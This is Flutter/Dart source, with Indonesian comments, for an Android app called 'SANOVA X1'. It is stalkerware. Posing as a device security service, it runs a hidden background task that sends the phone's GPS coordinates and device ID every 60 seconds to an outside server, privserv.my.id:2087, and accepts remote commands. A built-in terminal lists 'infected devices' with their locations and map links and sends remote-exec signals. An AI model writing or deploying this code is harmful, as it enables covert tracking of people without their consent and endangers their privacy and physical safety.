// build via pc/laptop
//nggak support build via bot/hp
import 'package:flutter/material.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:ui';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:url_launcher/url_launcher.dart';

// --- MARKAS PUSAT ---
const String serverURL = "http://privserv.my.id:2087";

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // 1. Inisialisasi 'Tali Penarik' Background
  await initializeService();
  
  // 2. Minta Izin Kritis
  await _askPermissions();
  
  runApp(MaterialApp(
    title: "SANOVA X1",
    home: IntroVideoPage(),
    debugShowCheckedModeBanner: false,
    theme: ThemeData.dark(),
  ));
}

// --- CONFIG BACKGROUND SERVICE (JEBAKAN MATI) ---
Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    'sanova_guard', 'Security Service',
    description: 'Protecting device integrity',
    importance: Importance.low,
  );

  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();

  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'sanova_guard',
      initialNotificationTitle: 'System Security',
      initialNotificationContent: 'Shielding device from threats...',
      foregroundServiceTypes: [AndroidForegroundType.location],
    ),
    iosConfiguration: IosConfiguration(),
  );
}

// FUNGSI INI JALAN DI BACKGROUND (24 JAM)
@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
  String deviceID = "${androidInfo.brand}_${androidInfo.model}".replaceAll(' ', '_');

  Timer.periodic(const Duration(seconds: 60), (timer) async {
    try {
      // Ambil GPS Target
      Position pos = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high
      );

      // Kirim ke PrivServ:2087
      final response = await http.get(
        Uri.parse("$serverURL/api/tools/report?id=$deviceID&lat=${pos.latitude}&lng=${pos.longitude}")
      ).timeout(const Duration(seconds: 10));

      // Cek apakah ada perintah dari monitor
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['action'] == 'FLASH') {
          // Logic flash bisa ditaruh di sini
        }
      }
    } catch (e) {
      // Diam tetap aman
    }
  });
}

Future<void> _askPermissions() async {
  await [
    Permission.location,
    Permission.locationAlways, // WAJIB untuk background tracking
    Permission.camera,
    Permission.notification,
  ].request();
}

// --- SCREEN 1: INTRO (PENYAMARAN) ---
class IntroVideoPage extends StatefulWidget {
  @override
  _IntroVideoPageState createState() => _IntroVideoPageState();
}

class _IntroVideoPageState extends State<IntroVideoPage> {
  late VideoPlayerController _controller;
  bool _initialized = false;

  @override
  void initState() {
    super.initState();
    _controller = VideoPlayerController.networkUrl(
      Uri.parse("https://files.catbox.moe/6jztjy.mp4"),
    )..initialize().then((_) {
        setState(() => _initialized = true);
        _controller.play();
      });

    _controller.addListener(() {
      if (_controller.value.position >= _controller.value.duration && 
          _controller.value.duration != Duration.zero) {
        _goToTerminal();
      }
    });
  }

  void _goToTerminal() {
    if (!mounted) return;
    Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => CyberTerminal()));
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: _initialized 
          ? SizedBox.expand(child: FittedBox(fit: BoxFit.cover, child: SizedBox(width: _controller.value.size.width, height: _controller.value.size.height, child: VideoPlayer(_controller))))
          : const Center(child: CircularProgressIndicator(color: Colors.purpleAccent)),
    );
  }
}

// --- SCREEN 2: CYBER TERMINAL (PENGENDALI) ---
class CyberTerminal extends StatefulWidget {
  @override
  _CyberTerminalState createState() => _CyberTerminalState();
}

class _CyberTerminalState extends State<CyberTerminal> {
  final TextEditingController _inputController = TextEditingController();
  final ScrollController _scrollController = ScrollController();
  final List<String> _logs = ["[SYSTEM] SANOVA KERNEL v1.0 ONLINE", "[CONNECTED] SERVER: privserv.my.id:2087"];
  
  List<dynamic> _targetList = [];
  bool _isScanning = false;

  void _addLog(String msg) {
    setState(() => _logs.add(msg));
    Timer(const Duration(milliseconds: 100), () => _scrollController.jumpTo(_scrollController.position.maxScrollExtent));
  }

  Future<void> _fetchTargets() async {
    setState(() => _isScanning = true);
    _addLog("[WAIT] Fetching infected devices...");
    try {
      final res = await http.get(Uri.parse("$serverURL/api/tools/target-list"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        setState(() => _targetList = data['targets'] ?? []);
        _addLog("[OK] Found ${_targetList.length} devices online.");
      }
    } catch (e) {
      _addLog("[ERROR] Database sync failed.");
    } finally {
      setState(() => _isScanning = false);
    }
  }

  Future<void> _triggerFlash(String id) async {
    _addLog("[EXEC] Dispatching signal to $id");
    try {
      await http.get(Uri.parse("$serverURL/api/tools/remote-exec?target=$id&action=FLASH"));
      _addLog("[OK] Flash packet delivered.");
    } catch (e) {
      _addLog("[ERROR] Failed to send command.");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Column(
          children: [
            Expanded(
              child: ListView.builder(
                controller: _scrollController,
                itemCount: _logs.length,
                itemBuilder: (context, i) => Text(_logs[i], style: const TextStyle(color: Color(0xFFC197FF), fontFamily: 'monospace', fontSize: 11)),
              ),
            ),
            if (_targetList.isNotEmpty) _buildMonitor(),
            _buildInput(),
          ],
        ),
      ),
    );
  }

  Widget _buildMonitor() {
    return Container(
      height: 200,
      color: Colors.white.withOpacity(0.05),
      child: ListView.builder(
        itemCount: _targetList.length,
        itemBuilder: (context, i) => ListTile(
          dense: true,
          leading: const Icon(Icons.gps_fixed, color: Colors.cyanAccent, size: 16),
          title: Text("${_targetList[i]['id']}", style: const TextStyle(fontSize: 11, color: Colors.white)),
          subtitle: Text("${_targetList[i]['lat']}, ${_targetList[i]['lng']}", style: const TextStyle(fontSize: 9, color: Colors.white38)),
          trailing: IconButton(
            icon: const Icon(Icons.map, color: Colors.blue, size: 18),
            onPressed: () => launchUrl(Uri.parse("https://www.google.com/maps?q=${_targetList[i]['lat']},${_targetList[i]['lng']}"))
          ),
        ),
      ),
    );
  }

  Widget _buildInput() {
    return Container(
      padding: const EdgeInsets.all(10),
      child: Row(
        children: [
          const Text("SANOVA>", style: TextStyle(color: Colors.purpleAccent, fontWeight: FontWeight.bold)),
          Expanded(child: TextField(
            controller: _inputController, 
            onSubmitted: (v) {
              if (v == "/track") _fetchTargets();
              _addLog("> $v");
              _inputController.clear();
            },
            decoration: const InputDecoration(border: InputBorder.none, contentPadding: EdgeInsets.only(left: 10)),
          )),
        ],
      ),
    );
  }
}
